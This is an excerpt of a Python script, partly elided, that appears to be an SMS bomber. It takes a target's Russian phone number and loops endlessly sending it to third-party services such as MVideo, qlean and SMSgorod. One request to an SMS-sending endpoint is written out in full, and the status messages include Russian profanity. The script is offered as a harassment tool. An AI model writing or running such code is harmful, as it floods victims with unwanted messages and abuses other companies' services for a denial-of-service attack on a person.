...
print(banner)
_phone = input('Номер телефона (79xxxxxxxxx)--->> ')
...
while True:
	...
	try:
		...
		print(' пиздец MVideo отправлено!')
	except:
		print('  Не отправлено!')
	...
	try:
		...
		print(' пиздец qlean отправлено!')
	except:
		print('  Не отправлено!')

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print(' пиздец SMSgorod отправлено!')
	except:
		print('  Не отправлено!')
